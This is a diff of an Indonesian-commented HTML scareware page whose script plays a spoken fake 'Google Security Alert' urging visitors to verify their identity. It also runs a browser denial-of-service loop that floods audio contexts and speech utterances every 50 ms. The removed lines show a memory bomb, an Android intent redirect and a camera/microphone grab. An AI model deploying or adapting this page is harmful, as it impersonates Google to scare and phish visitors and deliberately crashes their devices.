@@ -3,28 +3,24 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Critical</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #111; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
   iframe, audio, video, embed, object, svg, canvas { display: none !important; }
-  h1 { animation: blink 0.5s infinite; }
-  @keyframes blink { 50% { opacity: 0.2; } }
-  #status { position: fixed; bottom: 20px; color: #0f0; }
 </style>
 </head>
 <body>
-
-<h1>☢️ SYSTEM FAILURE ☢️</h1>
-<div id="status">Initializing...</div>
-
 <script>
 (function () {
   'use strict';
 
+  // ============================================
+  // KONFIGURASI AUTOPLAY
+  // ============================================
   var CONFIG = {
     tts: {
-      text: "Google Security Alert. Your account has been accessed. System is now locked.",
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
       lang: 'en-US',
       rate: 0.85,
       pitch: 1.0,
@@ -38,7 +34,7 @@
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
   // ============================================
-  // 1. TTS (ORIGINAL)
+  // TTS — TANPA CANCEL DI DALAM LOOP
   // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
@@ -55,6 +51,8 @@
       var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
       if (enVoice) u.voice = enVoice;
 
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -74,7 +72,7 @@
   }
 
   // ============================================
-  // 2. AUDIO UNLOCK & MAIN AUDIO (ORIGINAL)
+  // AUDIO CONTEXT UNLOCK
   // ============================================
   function unlockAudioContext() {
     try {
@@ -93,6 +91,9 @@
     } catch (e) {}
   }
 
+  // ============================================
+  // SILENT AUDIO ELEMENT
+  // ============================================
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
@@ -103,6 +104,9 @@
     } catch (e) {}
   }
 
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
     state.mainPlayed = true;
@@ -126,100 +130,61 @@
       src.connect(ctx.destination);
       src.start();
       src.onended = startTTS;
+      setTimeout(startTTS, 3500);
     } catch (e) {
       startTTS();
     }
   }
 
   // ============================================
-  // 3. RESOURCE EXHAUSTION (UPGRADE: OOM + AUDIO FLOOD)
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
   // ============================================
-  var memoryHog = [];
   function triggerHighSeverityCrash() {
     console.log("[!] Initiating High Severity Exploit Chain...");
     
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
     setInterval(function() {
       try {
-        // A. Audio Flooding
-        for (var i = 0; i < 1000; i++) {
+        for (var i = 0; i < 2000; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
           var gain = ctx.createGain();
+          
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
           
-          var u = new SpeechSynthesisUtterance("CRASH_" + i);
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
           window.speechSynthesis.speak(u);
         }
-
-        // B. Memory Bomb (Alokasi 100MB per 50ms)
-        var bigArray = new Uint8Array(100 * 1024 * 1024);
-        bigArray.fill(1);
-        memoryHog.push(bigArray);
-
       } catch(e) {}
-    }, 50); 
-  }
-
-  // ============================================
-  // 4. INTENT REDIRECTION (ANDROID APP HIJACK)
-  // ============================================
-  function triggerIntent() {
-    console.log("[!] Triggering Intent Redirection...");
-    // Skema Intent: Membuka Settings Android (Ganti dengan target lain jika perlu)
-    var intentUrl = "intent://settings/#Intent;action=android.settings.SETTINGS;end";
-    try {
-      window.location.href = intentUrl;
-    } catch(e) {}
-  }
-
-  // ============================================
-  // 5. CAMERA/MIC HIJACK (ZERO-CLICK ATTEMPT)
-  // ============================================
-  function triggerCamera() {
-    console.log("[!] Requesting Camera/Mic...");
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-        .then(function(stream) {
-          console.log("🚨 KAMERA DIIZINKAN!");
-          // Hentikan stream setelah diizinkan agar tidak terlalu lama
-          stream.getTracks().forEach(function(t) { t.stop(); });
-        })
-        .catch(function(err) {
-          console.log("Kamera diblokir:", err.name);
-        });
-    }
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
   }
 
   // ============================================
   // EKSEKUSI BERTAHAP
   // ============================================
-  
-  // Start Autoplay
   unlockAudioContext();
   trySilentAudio();
 
   setTimeout(function () {
     unlockAudioContext();
-    startTTS(); 
+    startTTS(); // coba TTS lebih awal
   }, 100);
 
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
   }, 500);
 
-  // PANGGIL INTENT & KAMERA SETELAH 1 DETIK
-  setTimeout(function () {
-    triggerIntent();
-    triggerCamera();
-  }, 1000);
-
-  // PANGGIL CRASH SETELAH 1.5 DETIK
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
     triggerHighSeverityCrash();
+    
   }, 1500);
 
   // Retry jika audio diblokir
